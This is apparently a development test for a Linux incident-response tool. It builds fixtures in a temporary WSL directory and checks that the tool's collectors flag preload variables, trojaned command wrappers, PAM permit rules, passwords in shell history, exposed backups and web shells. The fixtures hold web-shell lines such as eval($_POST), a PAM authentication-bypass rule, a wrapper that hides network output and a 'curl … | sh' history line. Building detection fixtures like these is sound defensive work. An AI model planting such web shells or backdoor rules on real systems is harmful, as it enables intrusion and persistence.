// Development-only fixture test. Runs the catalog's embedded collectors in an
// owned WSL directory; never connects to or changes a real investigation target.
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { randomUUID, createHash } from "node:crypto";
import { spawnSync } from "node:child_process";

const repository = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
const evidence = path.join(repository, "target/lab-command-observations", randomUUID());
fs.mkdirSync(evidence, { recursive: true });
const source = fs.readFileSync(path.join(repository, "crates/lovelyhawk-core/src/command_workbench.rs"), "utf8");
const preamble = source.match(/concat!\(\s*r#"([\s\S]*?)"#,\s*\$body,/u)?.[1];
if (!preamble) throw new Error("Embedded collector preamble not found");
const names = ["COMMAND_WRAPPERS", "PROCESS_PRELOAD", "DELETED_PROCESS_FILES", "PAM_AUTH_RULES",
  "SHELL_HISTORY_OBSERVATIONS", "CREDENTIAL_FILE_OBSERVATIONS", "WEB_CODE_OBSERVATIONS"];
const scripts = Object.fromEntries(names.map(name => {
  const body = source.match(new RegExp(`const ${name}: &str = bounded_observation!\\(\\s*r#"([\\s\\S]*?)"#\\s*\\);`, "u"))?.[1];
  if (!body) throw new Error(`Embedded collector not found: ${name}`);
  return [name, `${preamble}${body}\nlh_finish\n`];
}));
const shq = text => `'${String(text).replaceAll("'", "'\\''")}'`;
function shell(script) {
  const result = spawnSync("wsl.exe", ["-d", "Ubuntu", "-e", "/bin/sh"], {
    input: script, encoding: "utf8", timeout: 75000, maxBuffer: 4 * 1024 * 1024, windowsHide: true,
  });
  if (result.error || result.signal) throw result.error ?? new Error(`WSL ended: ${result.signal}`);
  return { status: result.status, stdout: result.stdout, stderr: result.stderr };
}
const root = shell("mktemp -d /tmp/lovelyhawk-command-checks-XXXXXXXX\n").stdout.trim();
if (!/^\/tmp\/lovelyhawk-command-checks-[A-Za-z0-9]{8}$/u.test(root)) throw new Error("Unverified fixture root");
const report = { at: new Date().toISOString(), root, sourceSha256: createHash("sha256").update(source).digest("hex"),
  environment: shell("uname -m; cat /etc/os-release; /bin/sh -c 'echo shell=$0'; head --version | head -n 1\n"),
  scope: "WSL Ubuntu /bin/sh and owned fixture files, not a live SSH/VM compatibility result", checks: [] };
function writeFiles(files, extra = "") {
  const commands = Object.entries(files).map(([file, contents]) => {
    const destination = `${root}/${file}`;
    return `mkdir -p ${shq(path.posix.dirname(destination))}\nprintf '%s' ${shq(Buffer.from(contents).toString("base64"))} | base64 -d > ${shq(destination)}`;
  });
  const result = shell(`set -e\n${commands.join("\n")}\n${extra}\n`);
  if (result.status !== 0) throw new Error(`Fixture creation failed: ${result.stderr}`);
}
function mapped(name, fixture = "basic") {
  return scripts[name].replace(/\/usr\/local\/bin|\/etc\/pam\.d|\/etc\/ld\.so\.preload|\/proc|\/(?:usr\/)?lib(?:64)?\/security|\/lib\/\*\/security|\/usr\/share\/nginx|\/srv\/www|\/var\/www|\/home|\/root|\/etc(?![\w/])|\/opt/gu,
    value => `${root}/${fixture}${value}`);
}
function check(name, result, passed) {
  report.checks.push({ name, passed: Boolean(passed), ...result });
  console.log(`${passed ? "PASS" : "FAIL"} ${name}`);
}
try {
  writeFiles({
    "basic/usr/local/bin/ps": '#!/bin/sh\nexec /usr/bin/ps "$@"\n',
    "basic/usr/local/bin/ss": `#!/bin/sh\n/usr/bin/ss "$@" | grep -v hidden-marker\ntouch ${shq(`${root}/SHOULD_NEVER_EXECUTE`)}\n`,
    "basic/etc/pam.d/normal": "auth required pam_permit.so\nauth sufficient pam_unix.so\n# auth sufficient pam_permit.so\n",
    "basic/etc/pam.d/observed": "auth sufficient /lib/security/pam_permit.so\n# fixture-private-marker\n",
    "basic/etc/ld.so.preload": "# ordinary comment\n/fixture/private-library-marker.so\n",
    "basic/proc/41/environ": "USER=demo\0LD_PRELOAD=fixture-private-marker\0LD_AUDIT=fixture-private-marker\0TOKEN=fixture-private-marker\0",
    "basic/proc/42/environ": "USER=demo\0PROMPT_COMMAND=fixture-private-marker\0",
    "basic/proc/43/environ": "TOKEN=fixture-private-marker\nLD_PRELOAD=not-a-variable\0USER=demo\0",
    "basic/proc/41/maps": "1-2 r-xp 0000 00:00 1 /usr/lib/libnormal.so\n2-3 r-xp 0000 00:00 2 /opt/removed.so (deleted)\n",
    "basic/proc/42/maps": "1-2 r-xp 0000 00:00 1 /usr/lib/libnormal.so\n",
    "basic/proc/43/maps": "1-2 r-xp 0000 00:00 1 /usr/lib/libnormal.so\n",
    ...Object.fromEntries([41, 42, 43].map(pid => [`basic/proc/${pid}/stat`, `${pid} (fixture) S 1 ${pid} ${pid} ${Array(15).fill("0").join(" ")} ${pid * 100} 0\n`])),
  }, `mkdir -p ${shq(`${root}/basic/proc/41/fd`)} ${shq(`${root}/basic/proc/42/fd`)} ${shq(`${root}/basic/proc/43/fd`)}
ln -s '/fixture/log (deleted)' ${shq(`${root}/basic/proc/41/fd/5`)}
ln -s ${shq(`${root}/basic/etc/pam.d/observed`)} ${shq(`${root}/basic/usr/local/bin/top`)}
for p in 41 42 43; do mkdir -p ${shq(`${root}/basic/proc`)}/$p/ns; ln -s /usr/bin/sleep ${shq(`${root}/basic/proc`)}/$p/exe; ln -s 'mnt:[11]' ${shq(`${root}/basic/proc`)}/$p/ns/mnt; done`);
  const fingerprints = () => shell(`find ${shq(`${root}/basic`)} -type f -print0 | sort -z | xargs -0 sha256sum\n`).stdout;
  const before = fingerprints();
  let result = shell(mapped("COMMAND_WRAPPERS"));
  check("wrapper clue only, normal wrapper neutral, symlink reported", result,
    result.status === 1 && result.stdout.split("\n").filter(line => line.startsWith("关注：")).length === 1 &&
    result.stdout.includes("/ss |") && result.stdout.includes("符号链接未跟随"));
  result = shell(mapped("PAM_AUTH_RULES"));
  check("PAM sufficient permit is a clue; required and comments stay neutral", result,
    result.status === 0 && result.stdout.split("\n").filter(line => line.startsWith("关注：")).length === 1 &&
    !result.stdout.includes("fixture-private-marker"));
  result = shell(mapped("PROCESS_PRELOAD"));
  check("environment variable names without secret values", result,
    result.status === 0 && ["LD_PRELOAD", "LD_AUDIT", "PROMPT_COMMAND"].every(name => result.stdout.includes(`存在 ${name}`)) &&
    !result.stdout.includes("fixture-private-marker") && !result.stdout.includes("private-library-marker"));
  check("embedded newline in a value cannot forge an environment variable", {}, !result.stdout.includes("关注：PID 43"));
  check("correlation preserves PID parent session and real field-22 start time", {},
    result.stdout.includes("PID 41 | PPID / SID / 启动时钟 1 41 4100") && result.stdout.includes("文件映射：PID 41 | /usr/lib/libnormal.so"));
  result = shell(mapped("DELETED_PROCESS_FILES"));
  check("deleted FD and mapped library share the existing check", result,
    result.status === 0 && result.stdout.includes("FD 5") && result.stdout.includes("maps 第 2 行") &&
    result.stdout.split("\n").filter(line => line.startsWith("关注：")).length === 2);
  check("fixture source bytes unchanged and inspected wrapper not executed", {}, before === fingerprints() &&
    shell(`test ! -e ${shq(`${root}/SHOULD_NEVER_EXECUTE`)}\n`).status === 0);
  const single = pid => mapped("PROCESS_PRELOAD").replace(
    `for lh_proc in ${root}/basic/proc/[0-9]*; do`, `lh_single=1; for lh_proc in ${root}/basic/proc/${pid}; do`);
  result = shell(single(43));
  check("selected process without preload variables still has mapped-file context", result,
    result.status === 0 && result.stdout.includes("进程关联：PID 43") && result.stdout.includes("文件映射：PID 43") && !result.stdout.includes("关注：PID 43"));
  result = shell(single(99));
  check("exited selected process leaves a visible gap", result, result.status === 1 && result.stdout.includes("所选进程已退出"));
  result = shell(`readlink() {
    case "$1" in */41/exe)
      count=0; [ ! -e ${shq(`${root}/readlink-count`)} ] || count=$(cat ${shq(`${root}/readlink-count`)})
      count=$((count+1)); printf '%s' "$count" > ${shq(`${root}/readlink-count`)}
      if [ "$count" = 3 ]; then printf '/changed/executable\\n'; return 0; fi;;
    esac
    /usr/bin/readlink "$@"
  }
  ${single(41)}`);
  check("executable change during collection discards the correlation", result,
    result.status === 1 && result.stdout.includes("关联结果已丢弃") && !result.stdout.includes("进程关联：PID 41") && !result.stdout.includes("关注：PID 41"));

  const privateMarker = "fixture-private-password-4729";
  writeFiles({
    "files/root/.bash_history": [
      `mysql -uroot -p'${privateMarker}'`,
      `echo 'demo:${privateMarker}' | chpasswd`,
      `export PASSWORD='${privateMarker}'`,
      `PGPASSWORD=${privateMarker} psql`,
      "chpasswd --help", "grep 'password=example' settings.conf", "ssh -p22 localhost",
      "mysql --password=\"$DB_PASSWORD\"", "PASSWORD=$TOKEN", "echo 'mysql -pnot-a-command'",
      "printf '%s' 'mysql -pnot-a-command; password=not-an-assignment'",
      "# mysql -pnot-a-command", "mysql -p", "curl https://example.invalid/file | sh", "history -c",
      "echo 'hash:opaque' | chpasswd -e", "echo 'demo:$TOKEN'", "PASSWORD=", "echo password=example",
    ].join("\n") + "\n",
    "files/home/demo/.zsh_history": `: 1793400000:0;mariadb --password='${privateMarker}'\n`,
    "files/home/demo/.bash_history": "",
    "files/var/www/site/index.php": [
      "<?php", "// eval($_POST['ignored']);", "/* eval($_GET['ignored']); */",
      "$example = 'eval($_REQUEST[\"ignored\"]);';", "echo base64_decode('dGVzdA==');",
      "system('date');", "eval ( $_POST['run'] );", "eval(base64_decode($payload));",
      `// ${privateMarker}`, "/* multiline", "eval($_COOKIE['ignored']);", "*/",
      "/* comment */ shell_exec($_GET['run']);",
    ].join("\n"),
    "files/var/www/site/input.jsp": 'Runtime.getRuntime().exec(request.getParameter("cmd"));\nnew ProcessBuilder(request.getParameter("command"));\nRuntime.getRuntime().exec("date");\n',
    "files/var/www/site/code.asp": 'eval(Request("cmd"));\n',
    "files/var/www/site/static.txt": "eval($_POST['not-code']);",
    "files/var/www/site/.env.production": privateMarker,
    "files/var/www/site/backup.zip": privateMarker,
    "files/var/www/site/database.sql": privateMarker,
    "files/var/www/site/settings.bak": privateMarker,
    "files/var/www/site/assets.zip": "legitimate downloadable archive",
    "files/root/id_ed25519": privateMarker,
    "files/etc/private.dump": privateMarker,
    "files/home/demo/public_html/archive.dump": privateMarker,
    "files/var/www/site/strange\nname.php": "eval($_POST['not-safe-path']);",
    "files/var/www/site/deep/a/b/c/d/e/f/missed.php": "eval($_GET['beyond-depth']);",
  }, `ln -s ${shq(`${root}/files/root/.bash_history`)} ${shq(`${root}/files/var/www/site/link.php`)}\nchmod 600 ${shq(`${root}/files/root/id_ed25519`)}`);
  const filePrints = () => shell(`find ${shq(`${root}/files`)} -type f -print0 | sort -z | xargs -0 sha256sum\n`).stdout;
  const filesBefore = filePrints();
  result = shell(mapped("SHELL_HISTORY_OBSERVATIONS", "files"));
  check("history reports exact credential locations without commands or passwords", result,
    result.status === 0 && [1, 2, 3, 4, 14, 15].every(line => result.stdout.includes(`.bash_history | 第 ${line} 行`)) &&
    result.stdout.includes(".zsh_history | 第 1 行") && result.stdout.includes("历史文件为空") &&
    !result.stdout.includes(privateMarker) && !result.stdout.includes("-uroot") &&
    result.stdout.split("\n").filter(line => line.startsWith("关注：")).length === 8);
  check("help, variable values, search text, comments and encrypted chpasswd stay neutral", {},
    [5, 6, 7, 8, 9, 10, 11, 12, 13, 16, 17, 18, 19].every(line => !result.stdout.includes(`.bash_history | 第 ${line} 行`)));
  result = shell(mapped("CREDENTIAL_FILE_OBSERVATIONS", "files"));
  check("site secrets and backups are clues, ordinary archives and non-site dumps are neutral", result,
    result.status === 1 && [".env.production", "backup.zip", "database.sql", "settings.bak", "archive.dump"].every(name => result.stdout.includes(`${name} |`)) &&
    !result.stdout.includes("assets.zip") && !result.stdout.includes("private.dump") && !result.stdout.includes(privateMarker) &&
    result.stdout.includes("id_ed25519") && result.stdout.includes("不证明能够通过网站下载"));
  result = shell(mapped("WEB_CODE_OBSERVATIONS", "files"));
  check("PHP request execution, decoder execution and JSP/ASP direct calls have locations", result,
    result.status === 1 && [7, 8, 13].every(line => result.stdout.includes(`index.php | 第 ${line} 行`)) &&
    result.stdout.includes("input.jsp | 第 1 行") && result.stdout.includes("input.jsp | 第 2 行") &&
    result.stdout.includes("code.asp | 第 1 行") && result.stdout.split("\n").filter(line => line.startsWith("关注：")).length === 6);
  check("comments, examples, ordinary decoding and fixed commands do not become WebShell findings", {},
    !result.stdout.includes(privateMarker) && !result.stdout.includes("static.txt |") && !result.stdout.includes("$_POST") &&
    !result.stdout.includes("input.jsp | 第 3 行"));
  check("links, hostile path separators and depth limits remain explicit gaps", {},
    result.stdout.includes("符号链接") && result.stdout.includes("控制字符") && result.stdout.includes("目录达到 6 层") &&
    !result.stdout.includes("strange") && !result.stdout.includes("missed.php"));
  check("all added inspections leave file contents unchanged", {}, filesBefore === filePrints());

  writeFiles({ "cut/root/.bash_history": `#${"x".repeat(65520)}\nmysql -p'${privateMarker}'\n`,
    "nul/root/.bash_history": `# header\0not-an-extra-line\nmysql -p${privateMarker}\n`,
    "failed-tree/var/www/test.php": "eval($_GET['x']);" });
  result = shell(mapped("SHELL_HISTORY_OBSERVATIONS", "cut"));
  check("a cut history line is not classified as a complete command", result,
    result.status === 1 && result.stdout.includes("64 KiB") && !result.stdout.includes("关注："));
  result = shell(mapped("SHELL_HISTORY_OBSERVATIONS", "nul"));
  check("NUL bytes do not invent history line numbers or expose values", result,
    result.status === 0 && result.stdout.includes("第 2 行") && !result.stdout.includes("第 3 行") && !result.stdout.includes(privateMarker));

  writeFiles({ "broken-find/find": "#!/bin/sh\nexit 9\n" }, `chmod 700 ${shq(`${root}/broken-find/find`)}`);
  result = shell(mapped("WEB_CODE_OBSERVATIONS", "failed-tree").replace("PATH=/usr/sbin:/usr/bin:/sbin:/bin", `PATH=${root}/broken-find:/usr/bin:/bin`));
  check("find errors cannot become a clean empty scan", result,
    result.status === 1 && result.stdout.includes("目录遍历失败") && !result.stdout.includes("关注："));

  shell(`mkdir -p ${shq(`${root}/linked`)}\nln -s ${shq(`${root}/files/home`)} ${shq(`${root}/linked/home`)}\n`);
  for (const name of ["SHELL_HISTORY_OBSERVATIONS", "WEB_CODE_OBSERVATIONS"]) {
    result = shell(mapped(name, "linked"));
    check(`${name} rejects a symlink in an ancestor directory`, result,
      result.status === 1 && result.stdout.includes("上级是符号链接") && !result.stdout.includes("关注："));
  }
  const limitedNames = Array.from({ length: 2050 }, (_, i) => `${root}/failed-tree/var/www/missing-${i}.php\0`).join("");
  writeFiles({ "many-find/names": limitedNames,
    "many-find/find": `#!/bin/sh\n/usr/bin/head -c 262145 ${shq(`${root}/many-find/names`)}\n` }, `chmod 700 ${shq(`${root}/many-find/find`)}`);
  result = shell(mapped("WEB_CODE_OBSERVATIONS", "failed-tree").replace("PATH=/usr/sbin:/usr/bin:/sbin:/bin", `PATH=${root}/many-find:/usr/bin:/bin`));
  check("a large directory list remains bounded and reports unvisited objects", result,
    result.status === 1 && result.stdout.includes("目录列表达到 2048") && result.stdout.includes("已检查对象 2048"));
  writeFiles({ "long-find/names": `${root}/failed-tree/var/www/${"x".repeat(270000)}.php\0`,
    "long-find/find": `#!/bin/sh\n/usr/bin/head -c 270100 ${shq(`${root}/long-find/names`)}\n` }, `chmod 700 ${shq(`${root}/long-find/find`)}`);
  result = shell(mapped("WEB_CODE_OBSERVATIONS", "failed-tree").replace("PATH=/usr/sbin:/usr/bin:/sbin:/bin", `PATH=${root}/long-find:/usr/bin:/bin`));
  check("byte-limited NUL records cannot create a partial path or false finding", result,
    result.status === 1 && result.stdout.includes("256 KiB") && result.stdout.includes("已检查对象 0") && !result.stdout.includes("关注："));

  writeFiles({ "limit/usr/local/bin/ps": `#!/bin/sh\n#${"x".repeat(70000)}\n/usr/bin/ps | grep -v hidden\n` });
  result = shell(mapped("COMMAND_WRAPPERS", "limit"));
  check("byte cap remains an explicit incomplete result", result,
    result.status === 1 && result.stdout.includes("64 KiB") && !result.stdout.includes("关注："));
  const many = Object.fromEntries(Array.from({ length: 270 }, (_, i) => [`many/proc/${50000 + i}/environ`, "LD_PRELOAD=fixture-private-marker\0"]));
  for (let i = 50000; i < 50270; i++) {
    many[`many/proc/${i}/stat`] = `${i} (fixture) S 1 ${i} ${i} ${Array(15).fill("0").join(" ")} ${i * 100} 0\n`;
    many[`many/proc/${i}/maps`] = "";
  }
  writeFiles(many, `for p in ${shq(`${root}/many/proc`)}/*; do mkdir -p "$p/ns"; ln -s /usr/bin/sleep "$p/exe"; ln -s 'mnt:[11]' "$p/ns/mnt"; done`);
  result = shell(mapped("PROCESS_PRELOAD", "many"));
  check("270 hits retain 256 with honest totals and nonzero partial status", result,
    result.status === 1 && result.stdout.includes("关注线索 270") && result.stdout.includes("只展示前 256") &&
    result.stdout.split("\n").filter(line => line.startsWith("关注：")).length === 256);
  result = shell(mapped("PROCESS_PRELOAD").replace("PATH=/usr/sbin:/usr/bin:/sbin:/bin", `PATH=${root}/no-tools`));
  check("missing tools never look like an empty success", result, result.status === 1 && result.stdout.includes("本项未执行"));
  const tools = ["head", "tr", "wc", "awk", "readlink", "ls"];
  for (const missing of tools) {
    const directory = `${root}/without-${missing}`;
    const setup = shell(`set -e\nmkdir ${shq(directory)}\n${tools.filter(tool => tool !== missing).map(tool =>
      `ln -s "$(command -v ${tool})" ${shq(`${directory}/${tool}`)}`).join("\n")}\n`);
    if (setup.status !== 0) throw new Error(setup.stderr);
    result = shell(mapped("PROCESS_PRELOAD").replace("PATH=/usr/sbin:/usr/bin:/sbin:/bin", `PATH=${directory}`));
    check(`preflight refuses missing ${missing}`, result, result.status === 1 && result.stdout.includes(`工具不可用：${missing}`));
  }
  writeFiles({ "fake-bin/head": "#!/bin/sh\nexit 17\n" }, `chmod 700 ${shq(`${root}/fake-bin/head`)}`);
  result = shell(mapped("PROCESS_PRELOAD").replace("PATH=/usr/sbin:/usr/bin:/sbin:/bin", `PATH=${root}/fake-bin:/usr/bin:/bin`));
  check("failed reads are reported even with a downstream pipe", result, result.status === 1 && result.stdout.includes("读取失败"));
  check("collectors need neither Python nor privileged or external script execution", {},
    Object.values(scripts).every(script => !/python|sudo |eval |source /u.test(script)));
} catch (error) {
  report.failure = String(error.stack ?? error);
  console.error(report.failure);
} finally {
  fs.writeFileSync(path.join(evidence, "report.json"), JSON.stringify(report, null, 2));
  console.log(`Evidence: ${evidence}`);
}
process.exitCode = report.failure || report.checks.some(item => !item.passed) ? 1 : 0;
